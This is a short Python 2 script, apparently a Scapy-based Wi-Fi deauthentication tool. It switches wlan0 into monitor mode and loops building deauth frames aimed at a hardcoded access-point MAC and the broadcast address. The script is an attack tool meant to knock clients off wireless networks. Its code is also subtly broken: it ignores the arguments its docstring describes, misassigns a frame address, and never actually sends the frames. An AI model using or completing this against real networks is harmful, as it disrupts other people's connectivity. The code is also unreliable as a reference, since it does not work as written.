'''
Provide Command Line Arguments
python wifi_dos <channel of AP> <MAC of AP> <MAC of Client> <interface>
'''

import time  # Giving Delay
import os  # running system commands
import sys  # Handle arguments and other system funcion
import signal  # Handle Keyboad Interrupts

from scapy.all import *  # Importing Kali Linux
conf.verb = 0  # Dont display any non-sense Scapy
conf.iface = "wlan0"


def init():
    # Killing all WIfI Blocking Services
    os.system("airmon-ng check kill")
    os.system("ifconfig wlan0 down")
    os.system("iwconfig wlan0 mode monitor")
    os.system("ifconfig wlan0 up")
    os.system("iw dev wlan0 set channel 1")


def signal_handler(signal, frame):
    os.system("ifconfig wlan0 down")
    os.system("iwconfig wlan0 mode managed")
    os.system("ifconfig wlan0 up")
    os.system("service network-manager restart")
    print "Wi-Fi Deauth Tool Stopped Successfully"
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)


if __name__ == "__main__":
    init()
    client_mac = "ff:ff:ff:ff:ff:ff"
    ap_mac = "1c:1d:86:b6:c4:e0"

    while True:
        deAuthFrame = RadioTap()/Dot11(addr1=client_mac, addr2=client_mac,
                                       addr3=ap_mac)/Dot11Deauth()
        print "DeAuth for AP ", ap_mac, " and client ", client_mac
        time.sleep(1)
